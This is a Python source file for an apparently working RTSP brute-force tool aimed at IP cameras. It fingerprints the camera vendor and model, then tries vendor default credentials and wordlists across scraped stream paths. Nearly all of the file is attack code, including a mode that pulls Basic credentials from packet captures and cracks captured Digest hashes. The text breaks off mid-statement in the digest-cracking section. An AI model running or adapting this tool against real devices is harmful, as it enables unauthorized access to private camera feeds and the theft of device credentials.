#! /usr/bin/env python3
"""RTSP Brute Force — vendor/model-aware RTSP credential brute forcer.

Given a list of IP cameras (or a packet capture), it:

  1. Fast TCP reachability pre-check (offline hosts skipped instantly).
  2. Fingerprints each camera's vendor AND model (ONVIF when available, else
     RTSP/HTTP headers).
  3. Builds an ordered list of RTSP *routes* (stream paths + ports) for that
     vendor/model from the bundled scraped ispyconnect database
     (``data/cameras.csv``) — the model-specific paths first, then the
     vendor-wide paths, then a set of generic fall-back paths (including the
     bare ``rtsp://host:port`` root, which a few DVRs accept).
  4. Brute forces with a native RTSP ``DESCRIBE`` engine (no per-attempt FFmpeg
     process): first an unauthenticated route-discovery pass, then a credential
     attack that tries the fingerprinted vendor's default credential FIRST,
     then the user-supplied user/password wordlists. Stops at the first working
     credential+route per host.

Concurrency uses a thread pool (RTSP/socket work is I/O-bound), not a process
pool. OpenCV is used only for the optional frame capture on success.

Authorized use only — operate cameras you own or have explicit permission to
access.
"""

import os

# Bound FFmpeg/RTSP connection + read time so the optional frame capture on a
# reachable-but-slow host doesn't hang a worker. Must be set before cv2 (and
# therefore FFmpeg) is imported.
os.environ.setdefault(
    "OPENCV_FFMPEG_CAPTURE_OPTIONS",
    "rtsp_transport;tcp|stimeout;5000000|timeout;5000000",
)

import re
import csv
import socket
import threading
from pickle import dump
from hashlib import md5
from pathlib import Path
from datetime import date
from base64 import b64decode, b64encode
from collections import namedtuple, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime, time

# OpenCV is only needed for the optional frame capture on a successful login.
# The core brute-force engine is native RTSP, so the tool still runs without it.
try:
    import cv2  # type: ignore
    _HAS_CV2 = True
except Exception:
    _HAS_CV2 = False

# tqdm draws the per-phase progress bar. Optional: without it the tool runs
# exactly as before, just without the bar.
try:
    from tqdm import tqdm  # type: ignore
    _HAS_TQDM = True
except Exception:
    _HAS_TQDM = False

# When a tqdm bar is active, per-host log lines must go through ``tqdm.write`` so
# they print above the bar instead of tearing it. ``crack_host`` runs on worker
# threads, so writes to this are already serialised by ``lock`` in display().
_active_bar = None

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    message = f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}"
    if _active_bar is not None:
        _active_bar.write(message, end=end)
    else:
        print(message, end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

lock = threading.Lock()
# RTSP brute forcing is I/O bound (socket + network waits), so oversubscribe the
# CPU count. Overridable with -t/--threads.
threads_number = min(64, (os.cpu_count() or 4) * 5)

verbose = True
capture_frame = False

SCRIPT_DIR = Path(__file__).resolve().parent
# Scraped default-credentials list (vendor -> default user/pass). Bundled under
# ./data so the tool is fully self-contained. Override with -d.
DEFAULT_CREDS_PATHS = [
    SCRIPT_DIR / "data" / "default_credentials.csv",
]
# Scraped camera database (vendor/model -> RTSP stream paths + ports). Bundled
# under ./data so the tool is fully self-contained. Override with -b. The data
# was originally scraped from ispyconnect.com; refresh it by re-scraping and
# dropping the CSVs into ./data.
CAMERA_DB_PATHS = [
    SCRIPT_DIR / "data" / "cameras.csv",
]

# Substrings (lowercased) -> canonical vendor name. Matched against the RTSP/HTTP
# `Server` header, the 401 `WWW-Authenticate` realm and the HTML `<title>`.
# Kept in step with the scraped database's vendor names so a fingerprinted
# vendor lines up with its rows.
VENDOR_SIGNATURES = {
    "hikvision": "Hikvision", "dvrdvs": "Hikvision", "dnvrs-webs": "Hikvision",
    "dahua": "Dahua",
    "axis": "Axis",
    "amcrest": "Amcrest",
    "reolink": "Reolink",
    "foscam": "Foscam",
    "vivotek": "Vivotek",
    "mobotix": "Mobotix",
    "bosch": "Bosch",
    "samsung": "Samsung", "hanwha": "Hanwha",
    "sony": "Sony",
    "panasonic": "Panasonic",
    "ubiquiti": "Ubiquiti", "unifi": "Ubiquiti",
    "d-link": "D-Link", "dlink": "D-Link",
    "tp-link": "Tp-link", "tplink": "Tp-link", "tapo": "Tp-link",
    "trendnet": "Trendnet",
    "acti": "Acti",
    "geovision": "Geovision",
    "wyze": "Wyze",
    "lorex": "Lorex",
    "swann": "Swann",
    "uniview": "Uniview",
}

# Last-resort RTSP paths tried when the vendor/model is unknown, or appended
# after vendor/model routes. Ordered by real-world prevalence. The trailing
# "" / "/" preserve the old bare `rtsp://host:port` behaviour (a few DVRs
# stream at the root) as just another candidate route.
GENERIC_RTSP_PATHS = [
    "/Streaming/Channels/101",              # Hikvision & clones
    "/cam/realmonitor?channel=1&subtype=0",  # Dahua & clones
    "/h264/ch1/main/av_stream",
    "/live", "/live/ch0", "/live/ch00_0",
    "/onvif1", "/onvif-media/media.amp", "/axis-media/media.amp",
    "/11", "/stream1", "/video1", "/media/video1",
    "/user=[USERNAME]_password=[PASSWORD]_channel=1_stream=0.sdp",
    "/ISAPI/Streaming/Channels/101",
    "/", "",                                 # root / pathless (legacy behaviour)
]

# Generic credential pairs tried (with -a/--all-defaults) after the wordlist and
# any vendor-specific default, for cameras whose vendor isn't in the list.
# Ordered by real-world prevalence. Empty string = blank password.
COMMON_DEFAULTS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", ""),
    ("admin", "password"),
    ("root", "pass"),
    ("root", "root"),
    ("admin", "888888"),
]

# ONVIF is optional; when installed it yields both manufacturer AND model with
# high confidence. Without it we fall back to HTTP/RTSP header fingerprinting.
try:
    from onvif import ONVIFCamera  # type: ignore
    _HAS_ONVIF = True
except Exception:
    _HAS_ONVIF = False

ONVIF_PORTS = [80, 8000, 8899, 2020, 8080]

# Default port per protocol when a DB row reports port 0 ("unspecified").
DEFAULT_PORTS = {"rtsp": 554, "http": 80, "https": 443}

# Sensible defaults substituted for stream-parameter placeholders in scraped
# path templates.
_DEFAULT_TOKENS = {"CHANNEL": "1", "WIDTH": "1280", "HEIGHT": "720", "STREAM": "0"}


def normalize_key(value):
    """Lowercase-alphanumeric key for fuzzy vendor/model matching (e.g. 'D-Link'
    and 'D-link' both -> 'dlink')."""
    return re.sub(r"[^a-z0-9]", "", (value or "").lower())


def substitute(path, username, password, channel=1, width=1280, height=720):
    """Replace ``[TOKEN]`` placeholders in a scraped path template.

    Credentials placed inside the path/query string are URL-encoded here;
    credentials in the authority component are handled by the URL builder.
    """
    from urllib.parse import quote
    tokens = dict(_DEFAULT_TOKENS)
    tokens["CHANNEL"] = str(channel)
    tokens["WIDTH"] = str(width)
    tokens["HEIGHT"] = str(height)
    tokens["USERNAME"] = quote(username, safe="")
    tokens["PASSWORD"] = quote(password, safe="")

    def repl(match):
        return tokens.get(match.group(1).upper(), match.group(0))

    return re.sub(r"\[([A-Za-z]+)\]", repl, path)


# --------------------------------------------------------------------------
# Scraped camera database (vendor/model -> RTSP routes; vendor -> default creds)
# --------------------------------------------------------------------------
TemplateRow = namedtuple("TemplateRow", "vendor model conn protocol port path")

_STREAM_CONNS = {"FFMPEG", "MJPEG", "VLC"}


class CameraDB:
    """Query layer over the scraped ispyconnect CSVs (RTSP rows only)."""

    def __init__(self):
        self._by_vendor = defaultdict(list)
        self._by_vendor_model = defaultdict(list)
        self._defaults = defaultdict(list)      # vendor key -> [(user, pass), ...]
        self._all_default_combos = []           # de-duped ordered list of all pairs
        self.template_count = 0

    @classmethod
    def load(cls, cameras_csv, creds_csv):
        db = cls()
        if cameras_csv and Path(cameras_csv).exists():
            with open(cameras_csv, newline="", encoding="utf-8") as f:
                for row in csv.DictReader(f):
                    if (row.get("protocol") or "").lower() != "rtsp":
                        continue
                    path = (row.get("url") or "").strip()
                    if not path:
                        continue
                    try:
                        port = int(row.get("port") or 0)
                    except ValueError:
                        port = 0
                    tr = TemplateRow(vendor=row.get("vendor", ""),
                                     model=row.get("model", ""),
                                     conn=(row.get("type") or "").upper(),
                                     protocol="rtsp", port=port, path=path)
                    vk = normalize_key(tr.vendor)
                    db._by_vendor[vk].append(tr)
                    db._by_vendor_model[(vk, normalize_key(tr.model))].append(tr)
                    db.template_count += 1
        if creds_csv and Path(creds_csv).exists():
            with open(creds_csv, newline="", encoding="utf-8") as f:
                for row in csv.DictReader(f):
                    key = normalize_key(row.get("vendor", ""))
                    pair = ((row.get("default_username") or "").strip(),
                            (row.get("default_password") or "").strip())
                    if key and pair not in db._defaults[key]:
                        db._defaults[key].append(pair)
                    if pair not in db._all_default_combos:
                        db._all_default_combos.append(pair)
        return db

    @property
    def vendor_count(self):
        return len(self._defaults)

    @staticmethod
    def _rank(rows):
        """Continuous-stream rows first (best for a live probe)."""
        return sorted(rows, key=lambda r: r.conn not in _STREAM_CONNS)

    def templates_for(self, vendor, model=None):
        """RTSP templates most-likely first: exact vendor+model, then vendor-wide
        (which includes the ``*`` wildcard rows). De-duped on (port, path)."""
        if not vendor:
            return []
        vk = normalize_key(vendor)
        ordered = []
        if model:
            ordered.extend(self._by_vendor_model.get((vk, normalize_key(model)), []))
        ordered.extend(self._by_vendor.get(vk, []))
        result, seen = [], set()
        for r in self._rank(ordered):
            key = (r.port, r.path)
            if key not in seen:
                seen.add(key)
                result.append(r)
        return result

    def rtsp_routes(self, vendor, model, host_port, cap):
        """Ordered ``(path, port)`` route candidates for one host: vendor/model
        templates first, then the generic fall-back paths."""
        host_port = host_port or DEFAULT_PORTS["rtsp"]
        routes, seen = [], set()

        def add(path, port):
            key = (path, port)
            if key not in seen:
                seen.add(key)
                routes.append((path, port))

        for tr in self.templates_for(vendor, model):
            add(tr.path, tr.port or host_port)
        for path in GENERIC_RTSP_PATHS:
            add(path, host_port)
        if cap and cap > 0:
            routes = routes[:cap]
        return routes

    def default_creds_for(self, vendor):
        """Vendor-specific default credential pairs (empty if vendor unknown)."""
        return list(self._defaults.get(normalize_key(vendor), [])) if vendor else []

    def all_default_combos(self):
        return list(self._all_default_combos)


def resolve_path(explicit, candidates):
    """Pick a data file: an explicit path if it exists, else the first existing
    bundled candidate under ./data."""
    if explicit:
        return explicit if Path(explicit).exists() else None
    for candidate in candidates:
        if Path(candidate).exists():
            return str(candidate)
    return None


# --------------------------------------------------------------------------
# Target parsing / reachability
# --------------------------------------------------------------------------
def parse_target(target):
    """Split a target into ``(host, http_port, rtsp_port)``.

    Accepts a bare IP/host, ``host:rtsp_port`` or ``[v6]:rtsp_port``. The HTTP
    port is left at 80 (used only for fingerprinting)."""
    target = target.strip()
    host, http_port, rtsp_port = target, 80, 554
    if target.startswith('['):  # bracketed IPv6, optional :port
        end = target.find(']')
        if end != -1:
            host = target[1:end]
            rest = target[end + 1:]
            if rest.startswith(':') and rest[1:].isdigit():
                rtsp_port = int(rest[1:])
    elif target.count(':') == 1:  # host:port (bare IPv6 has multiple colons)
        head, _, tail = target.rpartition(':')
        if tail.isdigit():
            host, rtsp_port = head, int(tail)
    return host, http_port, rtsp_port


def tcp_reachable(host, ports, timeout):
    """True if a TCP connection succeeds on any of ``ports`` within ``timeout``."""
    for port in ports:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except OSError:
            continue
    return False


# --------------------------------------------------------------------------
# Fingerprinting
# --------------------------------------------------------------------------
def _header_value(raw, name):
    match = re.search(rf"(?im)^{re.escape(name)}:\s*(.+)$", raw)
    return match.group(1).strip() if match else ""


def _match_signature(*texts):
    blob = " ".join(text.lower() for text in texts if text)
    for needle, vendor in VENDOR_SIGNATURES.items():
        if needle in blob:
            return vendor
    return None


def _http_fingerprint(host, port, timeout):
    """Return a vendor guess from the HTTP `Server` header / 401 realm / title."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            request = (f"GET / HTTP/1.0\r\nHost: {host}\r\n"
                       f"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
                       f"Connection: close\r\n\r\n")
            sock.sendall(request.encode())
            chunks, total = [], 0
            while total < 65536:
                try:
                    data = sock.recv(4096)
                except socket.timeout:
                    break
                if not data:
                    break
                chunks.append(data)
                total += len(data)
        raw = b"".join(chunks).decode("latin-1", "replace")
    except OSError:
        return None
    title_match = re.search(r"<title>(.*?)</title>", raw, re.I | re.S)
    title = title_match.group(1).strip() if title_match else ""
    return _match_signature(_header_value(raw, "Server"),
                            _header_value(raw, "WWW-Authenticate"), title)


def _rtsp_fingerprint(host, port, timeout):
    """Return a vendor guess from the RTSP OPTIONS `Server` header."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            request = (f"OPTIONS rtsp://{host}:{port} RTSP/1.0\r\n"
                       f"CSeq: 1\r\nUser-Agent: RTSP-Brute-Force\r\n\r\n")
            sock.sendall(request.encode())
            raw = sock.recv(2048).decode("latin-1", "replace")
    except OSError:
        return None
    return _match_signature(_header_value(raw, "Server"))


def _onvif_fingerprint(host, http_port, username, password, timeout):
    """Return ``(vendor, model)`` via ONVIF GetDeviceInformation, or (None, None)."""
    if not _HAS_ONVIF:
        return None, None
    for port in ([http_port] if http_port else []) + ONVIF_PORTS:
        try:
            device = ONVIFCamera(host, port, username, password)
            info = device.devicemgmt.GetDeviceInformation()
            vendor = (info.Manufacturer or "").strip() or None
            model = (info.Model or "").strip() or None
            if vendor or model:
                return vendor, model
        except Exception:
            continue
    return None, None


def fingerprint(host, http_port, rtsp_port, username, password, timeout):
    """Identify a camera's ``(vendor, model)`` best-signal-first.

    ONVIF (vendor + model) -> HTTP headers (vendor) -> RTSP OPTIONS (vendor).
    Model is only recoverable via ONVIF; without it the vendor-wide RTSP routes
    still give broad coverage.
    """
    vendor, model = _onvif_fingerprint(host, http_port, username, password, timeout)
    if vendor is None:
        vendor = _http_fingerprint(host, http_port, timeout)
    if vendor is None:
        vendor = _rtsp_fingerprint(host, rtsp_port, timeout)
    return vendor, model


# --------------------------------------------------------------------------
# Native RTSP DESCRIBE engine
# --------------------------------------------------------------------------
def _www_field(www, name):
    """Extract a field value from a WWW-Authenticate header (quoted or bare)."""
    match = (re.search(name + r'\s*=\s*"([^"]*)"', www, re.I)
             or re.search(name + r'\s*=\s*([^,\s]+)', www, re.I))
    return match.group(1) if match else ""


def _digest_auth_header(www, user, password, method, uri):
    """Build a Digest ``Authorization`` value, with qop=auth support."""
    realm = _www_field(www, "realm")
    nonce = _www_field(www, "nonce")
    qop = _www_field(www, "qop")
    opaque = _www_field(www, "opaque")
    ha1 = md5(f"{user}:{realm}:{password}".encode()).hexdigest()
    ha2 = md5(f"{method}:{uri}".encode()).hexdigest()
    parts = [f'username="{user}"', f'realm="{realm}"', f'nonce="{nonce}"',
             f'uri="{uri}"']
    if qop and "auth" in qop.lower():
        nc = "00000001"
        cnonce = md5(f"{nonce}:{user}:{uri}".encode()).hexdigest()[:16]
        response = md5(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}".encode()).hexdigest()
        parts += [f'response="{response}"', "qop=auth", f"nc={nc}",
                  f'cnonce="{cnonce}"']
    else:
        response = md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
        parts.append(f'response="{response}"')
    if opaque:
        parts.append(f'opaque="{opaque}"')
    return "Digest " + ", ".join(parts)


def _auth_header(www, user, password, method, uri):
    low = www.lower().strip()
    if low.startswith("digest"):
        return _digest_auth_header(www, user, password, method, uri)
    if low.startswith("basic"):
        return "Basic " + b64encode(f"{user}:{password}".encode()).decode()
    return ""


def _describe(host, port, uri, timeout, cseq, auth=None):
    """Send one RTSP DESCRIBE and return ``(status_code, headers)``.

    ``status_code`` is None on a socket error. A fresh connection is used per
    request; the Digest nonce is reusable across connections, so caching the
    challenge (below) still avoids re-challenging per credential.
    """
    lines = [f"DESCRIBE {uri} RTSP/1.0", f"CSeq: {cseq}",
             "User-Agent: RTSP-Brute-Force", "Accept: application/sdp"]
    if auth:
        lines.append(f"Authorization: {auth}")
    request = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(request)
            raw = b""
            while b"\r\n\r\n" not in raw and len(raw) < 8192:
                try:
                    chunk = sock.recv(2048)
                except socket.timeout:
                    break
                if not chunk:
                    break
                raw += chunk
    except OSError:
        return None, {}
    text = raw.decode("latin-1", "replace")
    parts = text.split("\r\n", 1)[0].split()
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else None
    headers = {}
    for line in text.split("\r\n")[1:]:
        if ":" in line:
            key, _, value = line.partition(":")
            headers[key.strip().lower()] = value.strip()
    return code, headers


def _route_uri(host, port, raw_path, user, password):
    path = substitute(raw_path, user or "", password or "")
    if not path.startswith("/"):
        path = "/" + path
    return f"rtsp://{host}:{port}{path}"


def rtsp_bruteforce(host, routes, creds, timeout):
    """Two-phase native RTSP attack. Returns a result dict on success, else None.

    Phase A (route discovery): an unauthenticated DESCRIBE per route. A route
    that streams without auth (200) is an immediate open-access hit; routes that
    demand auth (401/403) are kept, and their challenge cached so the credential
    attack never re-challenges. Routes that 404/400 are dropped.

    Phase B (credential attack): try each credential against the primary route.
    A 200 is success. A 404 means the credential is valid but the path is wrong
    (auth-first cameras answer 401 for every path until authenticated), so we
    sweep the remaining routes with that now-known-good credential.
    """
    challenge = {}          # (path, port) -> WWW-Authenticate string
    auth_routes = []
    for raw_path, port in routes:
        uri = _route_uri(host, port, raw_path, "", "")
        code, headers = _describe(host, port, uri, timeout, 1)
        if code == 200:
            return {"user": "", "password": "", "url": uri, "unauthenticated": True}
        if code in (401, 403):
            auth_routes.append((raw_path, port))
            challenge[(raw_path, port)] = headers.get("www-authenticate", "")

    candidate_routes = auth_routes or routes
    if not candidate_routes:
        return None

    def attempt(raw_path, port, user, password):
        uri = _route_uri(host, port, raw_path, user, password)
        www = challenge.get((raw_path, port))
        if www is None:                      # not challenged yet (fallback path)
            code, headers = _describe(host, port, uri, timeout, 1)
            www = headers.get("www-authenticate", "")
            challenge[(raw_path, port)] = www
            if code != 401 and code != 403:  # 200 open, or 404/None -> decisive
                return code, uri
        auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
        if not auth:
            return 401, uri
        code, headers = _describe(host, port, uri, timeout, 2, auth=auth)
        # Refresh once on an expired (stale) nonce.
        if code in (401, 403) and "stale" in headers.get("www-authenticate", "").lower():
            www = headers.get("www-authenticate", "")
            challenge[(raw_path, port)] = www
            auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
            code, headers = _describe(host, port, uri, timeout, 3, auth=auth)
        return code, uri

    primary_path, primary_port = candidate_routes[0]
    for user, password in creds:
        code, uri = attempt(primary_path, primary_port, user, password)
        if code == 200:
            return {"user": user, "password": password, "url": uri}
        if code == 404:  # credential valid, wrong path -> sweep the other routes
            for raw_path, port in candidate_routes:
                sweep_code, sweep_uri = attempt(raw_path, port, user, password)
                if sweep_code == 200:
                    return {"user": user, "password": password, "url": sweep_uri}
            # Authenticated, but none of our known routes streamed. Report the
            # working credential anyway (path unknown).
            return {"user": user, "password": password, "url": uri, "no_route": True}
    return None


def capture_frame_from_url(url, host):
    """Save one frame from a working stream to frames/<host>.jpg (best effort)."""
    if not _HAS_CV2:
        return
    try:
        video_capture = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
        try:
            if video_capture.isOpened():
                ret, frame = video_capture.read()
                if ret:
                    safe = re.sub(r"[^A-Za-z0-9._-]", "_", host)
                    cv2.imwrite(f"frames/{safe}.jpg", frame)
        finally:
            video_capture.release()
    except Exception:
        pass


# --------------------------------------------------------------------------
# Per-host orchestration
# --------------------------------------------------------------------------
def ordered_credentials(vendor, base_combos, db, options):
    """Per-host credential order: the fingerprinted vendor's default(s) first,
    then the user-supplied combos, then (optionally) every scraped/common
    default as a fallback."""
    ordered, seen = [], set()

    def add(username, password):
        if (username, password) not in seen:
            seen.add((username, password))
            ordered.append((username, password))

    if options["use_defaults"] and vendor:
        for username, password in db.default_creds_for(vendor):
            add(username, password)
    for username, password in base_combos:
        add(username, password)
    if options["all_defaults"]:
        for username, password in db.all_default_combos():
            add(username, password)
        for username, password in COMMON_DEFAULTS:
            add(username, password)
    return ordered


def crack_host(target, base_combos, db, options):
    """Fingerprint one host, build its vendor/model routes, then brute force the
    credential x route space (first success wins). Returns a result dict."""
    host, http_port, rtsp_port = parse_target(target)

    if options["reach_timeout"] > 0 and not tcp_reachable(
            host, [rtsp_port, http_port], options["reach_timeout"]):
        with lock:
            if options["verbose"]:
                display('-', f"{Back.MAGENTA}{target}{Back.RESET} => Unreachable (skipped)")
        return {"status": "UNREACHABLE", "ip": target, "vendor": "", "model": "", "url": ""}

    vendor, model = (None, None)
    if options["fingerprint"]:
        vendor, model = fingerprint(host, http_port, rtsp_port,
                                    options["fp_user"], options["fp_pass"],
                                    options["reach_timeout"] or 3.0)
        if options["verbose"] and (vendor or model):
            with lock:
                display('*', f"{Back.MAGENTA}{target}{Back.RESET} => Vendor="
                             f"{Back.CYAN}{vendor or '?'}{Back.RESET} Model="
                             f"{Back.CYAN}{model or '?'}{Back.RESET}")

    routes = db.rtsp_routes(vendor, model, rtsp_port, options["max_routes"])
    creds = ordered_credentials(vendor, base_combos, db, options)

    result = rtsp_bruteforce(host, routes, creds, options["rtsp_timeout"])
    if result:
        if capture_frame:
            capture_frame_from_url(result["url"], host)
        note = ""
        if result.get("unauthenticated"):
            note = " (no auth)"
        elif result.get("no_route"):
            note = " (auth ok, stream path unknown)"
        with lock:
            display('+', f"{Back.BLUE}{result['user']}{Back.RESET}:{Back.CYAN}{result['password']}"
                         f"{Back.RESET}@{Back.MAGENTA}{target}{Back.RESET} => "
                         f"Access Granted (vendor={vendor or '?'}){note}")
        return {"status": "OK", "ip": target, "user": result["user"],
                "password": result["password"], "vendor": vendor or "",
                "model": model or "", "url": result["url"]}
    return {"status": "UNRESOLVED", "ip": target, "vendor": vendor or "",
            "model": model or "", "url": ""}


# --------------------------------------------------------------------------
# Packet-capture digest/basic cracking (unchanged)
# --------------------------------------------------------------------------
def calculateDigestResponse(username, password, realm, method, uri, nonce):
    hash_1 = md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    hash_2 = md5(f"{method}:{uri}".encode()).hexdigest()
    return md5(f"{hash_1}:{nonce}:{hash_2}".encode()).hexdigest()


def crack_digest_device(device, passwords):
    ip, username, realm, method, uri, nonce, response = device
    for password in passwords:
        if calculateDigestResponse(username, password, realm, method, uri, nonce) == response:
            with lock:
                display('+', f"{Back.BLUE}{username}{Back.RESET}:{Back.CYAN}{password}"
                             f"{Back.RESET}@{Back.MAGENTA}{ip}{Back.RESET} => Cracked")
            return {"status": "OK", "ip": ip, "user": username,
                    "password": password, "vendor": "", "model": "", "url": ""}
    return None


if __name__ == "__main__":
    arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',', either File Name or IP itself)"),
                              ('-C', "--capture-file", "capture_file", "Packet Capture Files (Seperated by ',')"),
                              ('-D', "--capture-file-data", "capture_file_data", "Dump Data Extracted from Capture File in Pickle Format (Optional)"),
                              ('-u', "--user", "user", "Username for Brute Force (Seperated by ',', either File Name or User itself)"),
                              ('-p', "--password", "password", "Password For Brute Force (Seperated by ',', either File Name or Password itself)"),
                              ('-d', "--default-creds", "default_creds", "Path to the scraped default-credentials CSV (default: bundled data/default_credentials.csv)"),
                              ('-b', "--camera-db", "camera_db", "Path to the scraped camera DB CSV of RTSP paths (default: bundled data/cameras.csv)"),
                              ('-f', "--fingerprint", "fingerprint", f"Fingerprint each camera's vendor/model and try its routes + default credential first (True/False, Default=True)"),
                              ('-a', "--all-defaults", "all_defaults", f"After the wordlist, also try every scraped/common default credential as a fallback (True/False, Default=False)"),
                              ('-m', "--max-routes", "max_routes", "Maximum RTSP route (path) candidates to try per host; 0 = unlimited (Default=25)"),
                              ('-t', "--threads", "threads", f"Number of worker threads (Default={threads_number})"),
                              ('-r', "--reach-timeout", "reach_timeout", "TCP reachability pre-check timeout in seconds; 0 disables it (Default=2.0)"),
                              ('-R', "--rtsp-timeout", "rtsp_timeout", "Per-request RTSP DESCRIBE timeout in seconds (Default=6.0)"),
                              ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                              ('-c', "--capture", "capture", f"Capture Frame if Successful Login (True/False, Default={capture_frame})"),
                              ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    if not arguments.password:
        display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
        display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
        arguments.password = ['']
    else:
        try:
            with open(arguments.password, 'rb') as file:
                display(':', f"Loading Passwords from File {Back.MAGENTA}{arguments.password}{Back.RESET}")
                arguments.password = [password for password in file.read().decode(errors="ignore").split('\n')]
                display('+', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        except FileNotFoundError:
            arguments.password = [password for password in arguments.password.split(',')]
        except OSError:
            arguments.password = [password for password in arguments.password.split(',')]
        except:
            display('-', f"Error Loading Passwords from File {Back.YELLOW}{arguments.password}{Back.RESET}")
            exit(0)
    if not arguments.ip and not arguments.capture_file:
        display('-', "Please Provide a List of IP Addresses")
        exit(0)
    elif arguments.capture_file:
        from scapy.all import rdpcap, IP, TCP, Raw
        rtsp_devices = {}
        rtsp_authentications = {}
        for packet_capture_file in arguments.capture_file.split(','):
            try:
                packets = rdpcap(packet_capture_file)
                for network_packet in packets:
                    try:
                        if Raw in network_packet and "RTSP" in network_packet[Raw].load.decode():
                            device_id = tuple(sorted([network_packet[IP].src, network_packet[IP].dst, str(network_packet[TCP].sport), str(network_packet[TCP].dport)]))
                            if "200 OK" in network_packet[Raw].load.decode() and device_id in rtsp_authentications:
                                rtsp_devices[device_id] = rtsp_authentications[device_id]
                            if "Authorization" in network_packet[Raw].load.decode():
                                raw_data = network_packet[Raw].load.decode().split('\n')
                                method = raw_data[0].split(' ')[0]
                                for line in raw_data:
                                    if "Authorization" in line and "digest" in line.lower():
                                        line = line[len("Authorization: Digest "):]
                                        rtsp_authentications[device_id] = {parameter.split('=')[0]: ' '.join(parameter.split('=')[1:]).replace('"', '') for parameter in line.split(', ')}
                                        rtsp_authentications[device_id]["method"] = method
                                        rtsp_authentications[device_id]["authorization"] = "DIGEST"
                                        rtsp_authentications[device_id]["device"] = network_packet[IP].dst
                                        rtsp_authentications[device_id]["source"] = network_packet[IP].src
                                        rtsp_authentications[device_id]["device_port"] = network_packet[TCP].dport
                                        rtsp_authentications[device_id]["source_port"] = network_packet[TCP].sport
                                        break
                                    elif "Authorization" in line:
                                        authorization = "BASIC"
                                        base64 = b64decode(line[len("Authorization: Basic "):].encode()).decode()
                                        username, password = base64.split(':')[0], ':'.join(base64.split(':')[1:])
                                        rtsp_authentications[device_id] = {
                                            "username": username,
                                            "password": password,
                                            "method": method,
                                            "authorization": authorization,
                                            "device": network_packet[IP].dst,
                                            "source": network_packet[IP].src,
                                            "device_port": network_packet[TCP].dport,
                                            "source_port": network_packet[TCP].sport
                                        }
                                        break
                    except:
                        pass
            except Exception as error:
                display('-', f"Error Occured while reading Packet Capture File {Back.MAGENTA}{packet_capture_file}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
        del rtsp_authentications
        rtsp_devices = list(rtsp_devices.values())
        successful_logins = []
        for rtsp_device in rtsp_devices:
            print(Fore.CYAN + '-'*100 + Fore.RESET)
            display('*', f"RTSP Device => {Back.MAGENTA}{rtsp_device['device']}{Back.RESET}")
            display('*', f"RTSP Client => {Back.MAGENTA}{rtsp_device['source']}{Back.RESET}")
            display('*', f"RTSP Device Port => {Back.MAGENTA}{rtsp_device['device_port']}{Back.RESET}")
            display('*', f"RTSP Client Port => {Back.MAGENTA}{rtsp_device['source_port']}{Back.RESET}")
            display('+', f"Method => {Back.MAGENTA}{rtsp_device['method']}{Back.RESET}")
            display('+', f"Authorization => {Back.MAGENTA}{rtsp_device['authorization']}{Back.RESET}")
            if rtsp_device['authorization'] == "DIGEST":
                display(':', f"\t* Username = {Back.MAGENTA}{rtsp_device['username']}{Back.RESET}")
                display(':', f"\t* Realm = {Back.MAGENTA}{rtsp_device['realm']}{Back.RESET}")
                display(':', f"\t* Nonce = {Back.MAGENTA}{rtsp_device['nonce']}{Back.RESET}")
                display(':', f"\t* URI = {Back.MAGENTA}{rtsp_device['uri']}{Back.RESET}")
                display(':', f"\t* Response = {Back.MAGENTA}{rtsp_device['response']}{Back.RESET}")
            else:
                display(':', f"\t* Username = {Back.MAGENTA}{rtsp_device['username']}{Back.RESET}")
                display(':', f"\t* Password = {Back.MAGENTA}{rtsp_device['password']}{Back.RESET}")
                successful_logins.append({"ip": rtsp_device["device"], "user": rtsp_device["username"], "password": rtsp_device["password"], "vendor": "", "model": "", "url": ""})
            print(Fore.CYAN + '-'*100 + Fore.RESET)
        if arguments.capture_file_data:
            with open(arguments.capture_file_data, 'wb') as file:
                dump(rtsp_devices, file)
        digest_devices = [[rtsp_device["device"], rtsp_device["username"], rtsp_device["realm"], rtsp_device["method"], rtsp_device["uri"], rtsp_device["nonce"], rtsp_device["response"].strip()] for rtsp_device in rtsp_devices if rtsp_device["authorization"] == "DIGEST"]
        if digest_devices:
            display(':', f"Cracking {Back.MAGENTA}{len(digest_devices)}{Back.RESET} Digest Authentication(s)", start='\n')
            if _HAS_TQDM:
